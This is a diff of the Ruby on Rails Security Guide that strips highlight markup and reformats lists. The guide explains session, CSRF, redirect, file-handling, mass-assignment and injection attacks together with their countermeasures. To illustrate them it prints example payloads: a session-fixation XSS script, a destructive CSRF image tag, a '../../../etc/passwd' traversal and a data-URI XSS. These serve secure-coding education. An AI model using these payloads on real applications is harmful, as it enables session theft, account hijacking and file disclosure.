@@ -3,7 +3,7 @@ Ruby On Rails Security Guide
 
 This manual describes common security problems in web applications and how to avoid them with Rails. After reading it, you should be familiar with:
 
-* All countermeasures _(highlight)that are highlighted_
+* All countermeasures _that are highlighted_
 * The concept of sessions in Rails, what to put in there and popular attack methods
 * How just visiting a site can be a security problem (with CSRF)
 * What you have to pay attention to when working with files or providing an administration interface
@@ -59,13 +59,13 @@ Many web applications have an authentication system: a user provides a user name
 
 Hence, the cookie serves as temporary authentication for the web application. Everyone who seizes a cookie from someone else, may use the web application as this user – with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:
 
-* Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN it is especially easy to listen to the traffic of all connected clients. This is one more reason not to work from a coffee shop. For the web application builder this means to _(highlight)provide a secure connection over SSL_. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:
+* Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN it is especially easy to listen to the traffic of all connected clients. This is one more reason not to work from a coffee shop. For the web application builder this means to _provide a secure connection over SSL_. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:
 
-```ruby
-config.force_ssl = true
-```
+    ```ruby
+    config.force_ssl = true
+    ```
 
-* Most people don't clear out the cookies after working at a public terminal. So if the last user didn't log out of a web application, you would be able to use it as this user. Provide the user with a _(highlight)log-out button_ in the web application, and _(highlight)make it prominent_.
+* Most people don't clear out the cookies after working at a public terminal. So if the last user didn't log out of a web application, you would be able to use it as this user. Provide the user with a _log-out button_ in the web application, and _make it prominent_.
 
 * Many cross-site scripting (XSS) exploits aim at obtaining the user's cookie. You'll read <a href="#cross-site-scripting-xss">more about XSS</a> later.
 
@@ -77,10 +77,10 @@ The main objective of most attackers is to make money. The underground prices fo
 
 Here are some general guidelines on sessions.
 
-* _(highlight)Do not store large objects in a session_. Instead you should store them in the database and save their id in the session. This will eliminate synchronization headaches and it won't fill up your session storage space (depending on what session storage you chose, see below).
+* _Do not store large objects in a session_. Instead you should store them in the database and save their id in the session. This will eliminate synchronization headaches and it won't fill up your session storage space (depending on what session storage you chose, see below).
 This will also be a good idea, if you modify the structure of an object and old versions of it are still in some user's cookies. With server-side session storages you can clear out the sessions, but with client-side storages, this is hard to mitigate.
 
-* _(highlight)Critical data should not be stored in session_. If the user clears his cookies or closes the browser, they will be lost. And with a client-side session storage, the user can read the data.
+* _Critical data should not be stored in session_. If the user clears his cookies or closes the browser, they will be lost. And with a client-side session storage, the user can read the data.
 
 ### Session Storage
 
@@ -88,11 +88,11 @@ NOTE: _Rails provides several storage mechanisms for the session hashes. The mos
 
 Rails 2 introduced a new default session storage, CookieStore. CookieStore saves the session hash directly in a cookie on the client-side. The server retrieves the session hash from the cookie and eliminates the need for a session id. That will greatly increase the speed of the application, but it is a controversial storage option and you have to think about the security implications of it:
 
-* Cookies imply a strict size limit of 4kB. This is fine as you should not store large amounts of data in a session anyway, as described before. _(highlight)Storing the current user's database id in a session is usually ok_.
+* Cookies imply a strict size limit of 4kB. This is fine as you should not store large amounts of data in a session anyway, as described before. _Storing the current user's database id in a session is usually ok_.
 
-* The client can see everything you store in a session, because it is stored in clear-text (actually Base64-encoded, so not encrypted). So, of course, _(highlight)you don't want to store any secrets here_. To prevent session hash tampering, a digest is calculated from the session with a server-side secret and inserted into the end of the cookie.
+* The client can see everything you store in a session, because it is stored in clear-text (actually Base64-encoded, so not encrypted). So, of course, _you don't want to store any secrets here_. To prevent session hash tampering, a digest is calculated from the session with a server-side secret and inserted into the end of the cookie.
 
-That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA512, which has not been compromised, yet). So _(highlight)don't use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters_. Put the secret in your environment.rb:
+That means the security of this storage depends on this secret (and on the digest algorithm, which defaults to SHA512, which has not been compromised, yet). So _don't use a trivial secret, i.e. a word from a dictionary, or one which is shorter than 30 characters_. Put the secret in your environment.rb:
 
 ```ruby
 config.action_dispatch.session = {
@@ -117,7 +117,7 @@ It works like this:
 
 Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers (mongrels). Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).
 
-The best _(highlight)solution against it is not to store this kind of data in a session, but in the database_. In this case store the credit in the database and the logged_in_user_id in the session.
+The best _solution against it is not to store this kind of data in a session, but in the database_. In this case store the credit in the database and the logged_in_user_id in the session.
 
 ### Session Fixation
 
@@ -127,32 +127,32 @@ NOTE: _Apart from stealing a user's session id, the attacker may fix a session i
 
 This attack focuses on fixing a user's session id known to the attacker, and forcing the user's browser into using this id. It is therefore not necessary for the attacker to steal the session id afterwards. Here is how this attack works:
 
-# The attacker creates a valid session id: He loads the login page of the web application where he wants to fix the session, and takes the session id in the cookie from the response (see number 1 and 2 in the image).
-# He possibly maintains the session. Expiring sessions, for example every 20 minutes, greatly reduces the time-frame for attack. Therefore he accesses the web application from time to time in order to keep the session alive.
-# Now the attacker will force the user's browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: `&lt;script&gt; document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9"; &lt;/script&gt;`. Read more about XSS and injection later on.
-# The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim's browser will change the session id to the trap session id.
-# As the new trap session is unused, the web application will require the user to authenticate.
-# From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.
+* The attacker creates a valid session id: He loads the login page of the web application where he wants to fix the session, and takes the session id in the cookie from the response (see number 1 and 2 in the image).
+* He possibly maintains the session. Expiring sessions, for example every 20 minutes, greatly reduces the time-frame for attack. Therefore he accesses the web application from time to time in order to keep the session alive.
+* Now the attacker will force the user's browser into using this session id (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Read more about XSS and injection later on.
+* The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim's browser will change the session id to the trap session id.
+* As the new trap session is unused, the web application will require the user to authenticate.
+* From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.
 
 ### Session Fixation – Countermeasures
 
 TIP: _One line of code will protect you from session fixation._
 
-The most effective countermeasure is to _(highlight)issue a new session identifier_ and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:
+The most effective countermeasure is to _issue a new session identifier_ and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:
 
 ```ruby
 reset_session
 ```
 
-If you use the popular RestfulAuthentication plugin for user management, add reset_session to the SessionsController#create action. Note that this removes any value from the session, _(highlight)you have to transfer them to the new session_.
+If you use the popular RestfulAuthentication plugin for user management, add reset\_session to the SessionsController#create action. Note that this removes any value from the session, _you have to transfer them to the new session_.
 
-Another countermeasure is to _(highlight)save user-specific properties in the session_, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. _(highlight)These might change over the course of a session_, so these users will not be able to use your application, or only in a limited way.
+Another countermeasure is to _save user-specific properties in the session_, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. _These might change over the course of a session_, so these users will not be able to use your application, or only in a limited way.
 
 ### Session Expiry
 
 NOTE: _Sessions that never expire extend the time-frame for attacks such as cross-site reference forgery (CSRF), session hijacking and session fixation._
 
-One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to _(highlight)expire sessions in a database table_. Call `Session.sweep("20 minutes")` to expire sessions that were used longer than 20 minutes ago.
+One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to _expire sessions in a database table_. Call `Session.sweep("20 minutes")` to expire sessions that were used longer than 20 minutes ago.
 
 ```ruby
 class Session < ActiveRecord::Base
@@ -183,7 +183,7 @@ This attack method works by including malicious code or a link in a page that ac
 In the <a href="#sessions">session chapter</a> you have learned that most Rails applications use cookie-based sessions. Either they store the session id in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is, that it will also send the cookie, if the request comes from a site of a different domain. Let's start with an example:
 
 * Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob's project management application, rather than an image file.
-* `&lt;img src="http://www.webapp.com/project/1/destroy"&gt;`
+* `<img src="http://www.webapp.com/project/1/destroy">`
 * Bob's session at www.webapp.com is still alive, because he didn't log out a few minutes ago.
 * By viewing the post, the browser finds an image tag. It tries to load the suspected image from www.webapp.com. As explained before, it will also send along the cookie with the valid session id.
 * The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.
@@ -191,7 +191,7 @@ In the <a href="#sessions">session chapter</a> you have learned that most Rails 
 
 It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere – in a forum, blog post or email.
 
-CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) -- less than 0.1% in 2006 -- but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in my (and others) security contract work – _(highlight)CSRF is an important security issue_.
+CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) -- less than 0.1% in 2006 -- but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in my (and others) security contract work – _CSRF is an important security issue_.
 
 ### CSRF Countermeasures
 
@@ -201,17 +201,17 @@ The HTTP protocol basically provides two main types of requests - GET and POST (
 
 *Use GET if:*
 
-* The interaction is more _(highlight)like a question_ (i.e., it is a safe operation such as a query, read operation, or lookup).
+* The interaction is more _like a question_ (i.e., it is a safe operation such as a query, read operation, or lookup).
 
 *Use POST if:*
 
-* The interaction is more _(highlight)like an order_, or
-* The interaction _(highlight)changes the state_ of the resource in a way that the user would perceive (e.g., a subscription to a service), or
-* The user is _(highlight)held accountable for the results_ of the interaction.
+* The interaction is more _like an order_, or
+* The interaction _changes the state_ of the resource in a way that the user would perceive (e.g., a subscription to a service), or
+* The user is _held accountable for the results_ of the interaction.
 
 If your web application is RESTful, you might be used to additional HTTP verbs, such as PUT or DELETE. Most of today's web browsers, however do not support them - only GET and POST. Rails uses a hidden `_method` field to handle this barrier.
 
-_(highlight)POST requests can be sent automatically, too_. Here is an example for a link which displays www.harmless.com as destination in the browser's status bar. In fact it dynamically creates a new form that sends a POST request.
+_POST requests can be sent automatically, too_. Here is an example for a link which displays www.harmless.com as destination in the browser's status bar. In fact it dynamically creates a new form that sends a POST request.
 
 ```html
 <a href="http://www.harmless.com/" onclick="
@@ -230,7 +230,7 @@ Or the attacker places the code into the onmouseover event handler of an image:
 <img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
 ```
 
-There are many other possibilities, including Ajax to attack the victim in the background. The _(highlight)solution to this is including a security token in non-GET requests_ which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:
+There are many other possibilities, including Ajax to attack the victim in the background. The _solution to this is including a security token in non-GET requests_ which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:
 
 ```ruby
 protect_from_forgery :secret => "123456789012345678901234567890..."
@@ -249,7 +249,7 @@ end
 
 The above method can be placed in the `ApplicationController` and will be called when a CSRF token is not present on a non-GET request.
 
-Note that _(highlight)cross-site scripting (XSS) vulnerabilities bypass all CSRF protections_. XSS gives the attacker access to all elements on a page, so he can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.
+Note that _cross-site scripting (XSS) vulnerabilities bypass all CSRF protections_. XSS gives the attacker access to all elements on a page, so he can read the CSRF security token from a form or directly submit the form. Read <a href="#cross-site-scripting-xss">more about XSS</a> later.
 
 Redirection and Files
 ---------------------
@@ -274,7 +274,7 @@ This will redirect the user to the main action if he tried to access a legacy ac
 http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
 ```
 
-If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to _(highlight)include only the expected parameters in a legacy action_ (again a whitelist approach, as opposed to removing unexpected parameters). _(highlight)And if you redirect to an URL, check it with a whitelist or a regular expression_.
+If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to _include only the expected parameters in a legacy action_ (again a whitelist approach, as opposed to removing unexpected parameters). _And if you redirect to an URL, check it with a whitelist or a regular expression_.
 
 #### Self-contained XSS
 
@@ -282,15 +282,15 @@ Another redirection and self-contained XSS attack works in Firefox and Opera by 
 
 `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`
 
-This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, _(highlight)do not allow the user to supply (parts of) the URL to be redirected to_.
+This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, _do not allow the user to supply (parts of) the URL to be redirected to_.
 
 ### File Uploads
 
 NOTE: _Make sure file uploads don't overwrite important files, and process media files asynchronously._
 
-Many web applications allow users to upload files. _(highlight)File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so – one more reason to run web servers, database servers and other programs as a less privileged Unix user.
+Many web applications allow users to upload files. _File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so – one more reason to run web servers, database servers and other programs as a less privileged Unix user.
 
-When filtering user input file names, _(highlight)don't try to remove malicious parts_. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “....//” - the result will be “../”. It is best to use a whitelist approach, which _(highlight)checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the [attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master:)
+When filtering user input file names, _don't try to remove malicious parts_. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “....//” - the result will be “../”. It is best to use a whitelist approach, which _checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the [attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master:)
 
 ```ruby
 def sanitize_filename(filename)
@@ -305,9 +305,9 @@ def sanitize_filename(filename)
 end
 ```
 
-A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its _(highlight)vulnerability to denial-of-service attacks_. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.
+A significant disadvantage of synchronous processing of file uploads (as the attachment\_fu plugin may do with images), is its _vulnerability to denial-of-service attacks_. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.
 
-The solution to this is best to _(highlight)process media files asynchronously_: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.
+The solution to this is best to _process media files asynchronously_: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.
 
 ### Executable Code in File Uploads
 
@@ -315,7 +315,7 @@ WARNING: _Source code in uploaded files may be executed when placed in specific 
 
 The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file “file.cgi” with code in it, which will be executed when someone downloads the file.
 
-_(highlight)If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level downwards.
+_If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level downwards.
 
 ### File Downloads
 
@@ -327,7 +327,7 @@ Just as you have to filter file names for uploads, you have to do so for downloa
 send_file('/var/www/uploads/' + params[:filename])
 ```
 
-Simply pass a file name like “../../../etc/passwd” to download the server's login information. A simple solution against this, is to _(highlight)check that the requested file is in the expected directory_:
+Simply pass a file name like “../../../etc/passwd” to download the server's login information. A simple solution against this, is to _check that the requested file is in the expected directory_:
 
 ```ruby
 basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
@@ -350,7 +350,7 @@ In 2007 there was the first tailor-made trojan which stole information from an I
 
 Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.
 
-Refer to the Injection section for countermeasures against XSS. It is _(highlight)recommended to use the SafeErb plugin_ also in an Intranet or administration interface.
+Refer to the Injection section for countermeasures against XSS. It is _recommended to use the SafeErb plugin_ also in an Intranet or administration interface.
 
 *CSRF*  Cross-Site Reference Forgery (CSRF) is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.
 
@@ -360,17 +360,17 @@ Another example changed Google Adsense's e-mail address and password by. If the 
 
 Another popular attack is to spam your web application, your blog or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.
 
-For _(highlight)countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.
+For _countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.
 
 ### Additional Precautions
 
 The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:
 
-* It is very important to _(highlight)think about the worst case_: What if someone really got hold of my cookie or user credentials. You could _(highlight)introduce roles_ for the admin interface to limit the possibilities of the attacker. Or how about _(highlight)special login credentials_ for the admin interface, other than the ones used for the public part of the application. Or a _(highlight)special password for very serious actions_?
+* It is very important to _think about the worst case_: What if someone really got hold of my cookie or user credentials. You could _introduce roles_ for the admin interface to limit the possibilities of the attacker. Or how about _special login credentials_ for the admin interface, other than the ones used for the public part of the application. Or a _special password for very serious actions_?
 
-* Does the admin really have to access the interface from everywhere in the world? Think about _(highlight)limiting the login to a bunch of source IP addresses_. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.
+* Does the admin really have to access the interface from everywhere in the world? Think about _limiting the login to a bunch of source IP addresses_. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.
 
-* _(highlight)Put the admin interface to a special sub-domain_ such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.
+* _Put the admin interface to a special sub-domain_ such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.
 
 Mass Assignment
 ---------------
@@ -430,7 +430,7 @@ attr_protected :admin
 attr_protected :last_login, :as => :admin
 ```
 
-A much better way, because it follows the whitelist-principle, is the `attr_accessible` method. It is the exact opposite of `attr_protected`, because _(highlight)it takes a list of attributes that will be accessible_. All other attributes will be protected. This way you won't forget to protect attributes when adding new ones in the course of development. Here is an example:
+A much better way, because it follows the whitelist-principle, is the `attr_accessible` method. It is the exact opposite of `attr_protected`, because _it takes a list of attributes that will be accessible_. All other attributes will be protected. This way you won't forget to protect attributes when adding new ones in the course of development. Here is an example:
 
 ```ruby
 attr_accessible :name
@@ -511,7 +511,7 @@ If the parameter was nil, the resulting SQL query will be
 SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
 ```
 
-And thus it found the first user in the database, returned it and logged him in. You can find out more about it in [my blog post](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/). _(highlight)It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.
+And thus it found the first user in the database, returned it and logged him in. You can find out more about it in [my blog post](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/). _It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.
 
 ### Brute-Forcing Accounts
 
@@ -523,7 +523,7 @@ Because of this, most web applications will display a generic error message “u
 
 However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered user name or e-mail address has (not) been found. This allows an attacker to compile a list of user names and brute-force the accounts.
 
-In order to mitigate such attacks, _(highlight)display a generic error message on forgot-password pages, too_. Moreover, you can _(highlight)require to enter a CAPTCHA after a number of failed logins from a certain IP address_. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.
+In order to mitigate such attacks, _display a generic error message on forgot-password pages, too_. Moreover, you can _require to enter a CAPTCHA after a number of failed logins from a certain IP address_. Note, however, that this is not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.
 
 ### Account Hijacking
 
@@ -531,15 +531,15 @@ Many web applications make it easy to hijack user accounts. Why not be different
 
 #### Passwords
 
-Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _(highlight)make change-password forms safe against CSRF_, of course. And _(highlight)require the user to enter the old password when changing it_.
+Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring him to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _make change-password forms safe against CSRF_, of course. And _require the user to enter the old password when changing it_.
 
 #### E-Mail
 
-However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure _(highlight)require the user to enter the password when changing the e-mail address, too_.
+However, the attacker may also take over the account by changing the e-mail address. After he changed it, he will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure _require the user to enter the password when changing the e-mail address, too_.
 
 #### Other
 
-Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _(highlight)review your application logic and eliminate all XSS and CSRF vulnerabilities_.
+Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a web site controlled by the attacker. On that site is a crafted IMG-tag which results in a HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to his e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.
 
 ### CAPTCHAs
 
@@ -566,13 +566,13 @@ You can find more sophisticated negative CAPTCHAs in Ned Batchelder's [blog post
 * Randomize the field names
 * Include more than one honeypot field of all types, including submission buttons
 
-Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So _(highlight)negative CAPTCHAs might not be good to protect login forms_.
+Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So _negative CAPTCHAs might not be good to protect login forms_.
 
 ### Logging
 
 WARNING: _Tell Rails not to put passwords in the log files._
 
-By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can _(highlight)filter certain request parameters from your log files_ by appending them to `config.filter_parameters` in the application configuration. These parameters will be marked [FILTERED] in the log.
+By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker got (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can _filter certain request parameters from your log files_ by appending them to `config.filter_parameters` in the application configuration. These parameters will be marked [FILTERED] in the log.
 
 ```ruby
 config.filter_parameters << :password
@@ -588,7 +588,7 @@ password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseb
 
 It is interesting that only 4% of these passwords were dictionary words and the great majority is actually alphanumeric. However, password cracker dictionaries contain a large number of today's passwords, and they try out all kinds of (alphanumerical) combinations. If an attacker knows your user name and you use a weak password, your account will be easily cracked.
 
-A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the _(highlight)first letters of a sentence that you can easily remember_. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.
+A good password is a long alphanumeric combination of mixed cases. As this is quite hard to remember, it is advisable to enter only the _first letters of a sentence that you can easily remember_. For example "The quick brown fox jumps over the lazy dog" will be "Tqbfjotld". Note that this is just an example, you should not use well known phrases like these, as they might appear in cracker dictionaries, too.
 
 ### Regular Expressions
 
@@ -600,7 +600,7 @@ Ruby uses a slightly different approach than many other languages to match the e
   /^https?:\/\/[^\n]+$/i
 ```
 
-This may work fine in some languages. However, _(highlight)in Ruby ^ and $ match the *line* beginning and line end_. And thus a URL like this passes the filter without problems:
+This may work fine in some languages. However, _in Ruby ^ and $ match the *line* beginning and line end_. And thus a URL like this passes the filter without problems:
 
 ```
 javascript:exploit_code();/*
@@ -641,15 +641,15 @@ The most common parameter that a user might tamper with, is the id parameter, as
 @project = Project.find(params[:id])
 ```
 
-This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, _(highlight)query the user's access rights, too_:
+This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and he is not allowed to see that information, he will have access to it anyway. Instead, _query the user's access rights, too_:
 
 ```ruby
 @project = @current_user.projects.find(params[:id])
 ```
 
-Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, _(highlight)no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.
+Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, _no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.
 
-Don't be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. _(highlight)JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.
+Don't be fooled by security by obfuscation and JavaScript security. The Web Developer Toolbar for Mozilla Firefox lets you review and change every form's hidden fields. _JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. The Live Http Headers plugin for Mozilla Firefox logs every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.
 
 Injection
 ---------
@@ -662,14 +662,14 @@ Injection is very tricky, because the same code or parameter can be malicious in
 
 NOTE: _When sanitizing, protecting or verifying something, whitelists over blacklists._
 
-A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _(highlight)prefer to use whitelist approaches_:
+A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), _prefer to use whitelist approaches_:
 
 * Use before_filter :only => [...] instead of :except => [...]. This way you don't forget to turn it off for newly added actions.
 * Use attr_accessible instead of attr_protected. See the mass-assignment section for details
 * Allow &lt;strong&gt; instead of removing &lt;script&gt; against Cross-Site Scripting (XSS). See below for details.
 * Don't try to correct user input by blacklists:
-** This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
-** But reject malformed input
+    * This will make the attack work: "&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")
